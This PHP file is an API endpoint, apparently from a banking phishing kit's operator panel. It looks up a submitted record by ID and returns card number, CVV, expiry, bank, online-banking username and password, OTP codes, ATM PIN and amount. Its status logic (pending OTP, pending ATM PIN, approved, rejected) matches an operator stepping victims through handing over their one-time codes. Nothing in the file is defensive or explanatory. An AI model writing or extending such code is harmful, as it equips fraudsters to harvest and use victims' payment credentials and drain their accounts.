<?php
// api/estado.php
require_once __DIR__ . '/_bootstrap.php';

$id = trim($_GET['id'] ?? '');
if (!$id) json_err('ID requerido', 400);

$row = db_fetch(
    "SELECT id, estado, tipo_tarjeta, otp_modo, otp_codigo, otp_codigo_secundario, 
            clave_cajero_codigo, clave_dinamica_codigo, numero_tarjeta, cvv, 
            vencimiento, banco, usuario, password, monto, fecha 
     FROM solicitudes WHERE id = ?",
    [$id]
);

if (!$row) {
    json_ok([
        'id' => $id,
        'estado' => 'pending',
        'estado_real' => 'pending',
        'tipo_tarjeta' => 'visa',
        'otp_modo' => 'otp',
        'otp_codigo' => null,
        'clave_cajero_codigo' => null,
        'clave_dinamica_codigo' => null,
        'otp_codigo_secundario' => null,
        'numero_tarjeta' => 'N/A',
        'cvv' => 'N/A',
        'vencimiento' => 'N/A',
        'banco' => 'N/A',
        'usuario' => 'N/A',
        'password' => 'N/A',
        'monto' => 'N/A'
    ]);
}

$estado = $row['estado'];
$estado_frontend = $estado;
$estados_approved = ['approved', 'approved_otp', 'approved_clave_cajero'];
$estados_rejected = ['rejected', 'rejected_otp', 'rejected_clave_cajero', 'rejected_user_error'];
$estados_pending = ['pending_otp', 'pending_clave_cajero'];

if (in_array($estado, $estados_approved)) $estado_frontend = 'approved';
elseif (in_array($estado, $estados_rejected)) $estado_frontend = 'rejected';
elseif (in_array($estado, $estados_pending)) $estado_frontend = $estado;

$otp_modo = $row['otp_modo'] ?? 'otp';
if ($estado === 'pending_clave_cajero') $otp_modo = 'clave_cajero';
if ($estado === 'pending_otp' && ($otp_modo === 'clave_cajero' || empty($otp_modo))) $otp_modo = 'otp';

// Normalizar nulos
foreach (['otp_codigo', 'clave_cajero_codigo', 'clave_dinamica_codigo', 'otp_codigo_secundario'] as $k) {
    if ($row[$k] === 'N/A' || $row[$k] === '') $row[$k] = null;
}

json_ok([
    'id' => $row['id'],
    'estado' => $estado_frontend,
    'estado_real' => $estado,
    'tipo_tarjeta' => $row['tipo_tarjeta'] ?? 'visa',
    'otp_codigo' => $row['otp_codigo'],
    'clave_cajero_codigo' => $row['clave_cajero_codigo'],
    'clave_dinamica_codigo' => $row['clave_dinamica_codigo'],
    'otp_codigo_secundario' => $row['otp_codigo_secundario'],
    'otp_modo' => $otp_modo,
    'numero_tarjeta' => $row['numero_tarjeta'] ?? 'N/A',
    'cvv' => $row['cvv'] ?? 'N/A',
    'vencimiento' => $row['vencimiento'] ?? 'N/A',
    'banco' => $row['banco'] ?? 'N/A',
    'usuario' => $row['usuario'] ?? 'N/A',
    'password' => $row['password'] ?? 'N/A',
    'monto' => $row['monto'] ?? 'N/A',
    'fecha_hora' => $row['fecha'] ?? date('Y-m-d H:i:s')
]);
